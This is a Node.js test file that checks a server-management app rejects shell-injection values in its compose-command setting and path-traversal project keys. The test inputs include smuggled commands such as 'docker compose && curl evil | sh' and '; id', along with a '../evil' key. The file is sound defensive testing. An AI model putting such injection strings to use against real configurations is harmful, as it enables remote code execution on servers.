// Settings values that reach shell commands or file paths are validated (PR #2 review, cubic #3/#4).
const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'dockyard-val-'));
process.env.DB_PATH = path.join(tmp, 'test.db');
process.env.CONFIG_PATH = path.join(tmp, 'missing-config.json');
process.env.NOTES_PATH = path.join(tmp, 'notes.json');
process.env.ENCRYPTION_KEY = 'c'.repeat(64);

const express = require('express');
const db = require('../db');

// A row written before validation existed (or via an old import) with a malicious command
const serverId = db
  .prepare("INSERT INTO servers (env_key, name, host, ssh_username, docker_compose_cmd) VALUES ('dev', 'dev', '127.0.0.1', 'x', 'docker compose; id')")
  .run().lastInsertRowid;
db.prepare("INSERT INTO compose_stacks (server_id, name, path) VALUES (?, 'App', '/srv/app/docker-compose.yml')").run(serverId);

const app = express();
app.use(express.json());
app.use('/api/settings', require('./settings'));
app.use('/api/containers', require('./containers'));
app.use('/api/services', require('./services'));
const server = http.createServer(app);

const call = (port, method, urlPath, body) =>
  fetch(`http://127.0.0.1:${port}${urlPath}`, { method, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) })
    .then(async (r) => ({ status: r.status, body: await r.json().catch(() => ({})) }));

server.listen(0, async () => {
  const { port } = server.address();
  let failed = false;
  try {
    // Saving a server with an arbitrary compose command is rejected
    let r = await call(port, 'POST', '/api/settings/servers', { env_key: 'qa', name: 'qa', host: 'h', ssh_username: 'u', docker_compose_cmd: 'docker compose && curl evil | sh' });
    assert.strictEqual(r.status, 400, 'POST server with unknown compose command must be rejected');
    r = await call(port, 'PUT', `/api/settings/servers/${serverId}`, { env_key: 'dev', name: 'dev', host: 'h', ssh_username: 'u', docker_compose_cmd: 'docker-compose; id' });
    assert.strictEqual(r.status, 400, 'PUT server with unknown compose command must be rejected');
    r = await call(port, 'POST', '/api/settings/servers', { env_key: 'qa', name: 'qa', host: 'h', ssh_username: 'u', docker_compose_cmd: 'sudo docker compose' });
    assert.ok(r.status < 400, `allowed compose command must save (got ${r.status})`);

    // A stored bad command never reaches SSH: the action is refused first
    r = await call(port, 'POST', '/api/containers/dev/web/restart', { stackPath: '/srv/app/docker-compose.yml', serviceName: 'web' });
    assert.strictEqual(r.status, 400, 'container action with a stored bad compose command must be refused');
    assert.match(r.body.error, /Docker Compose command/);
    r = await call(port, 'POST', '/api/services/dev/0', { name: 'x', image: 'nginx' });
    assert.strictEqual(r.status, 400, 'add-service with a stored bad compose command must be refused');

    // Project keys that could escape the repos folder are rejected
    r = await call(port, 'PUT', '/api/settings/config/projects', { '../evil': { name: 'x', repo: 'https://example.com/x.git' } });
    assert.strictEqual(r.status, 400, 'project key with ../ must be rejected');
    r = await call(port, 'PUT', '/api/settings/config/projects', { api: { name: 'API', repo: 'https://example.com/api.git' } });
    assert.ok(r.status < 400, `valid project keys must save (got ${r.status})`);

    console.log('validation route tests passed');
  } catch (err) {
    failed = true;
    console.error(err);
  } finally {
    server.close();
    process.exit(failed ? 1 : 0);
  }
});
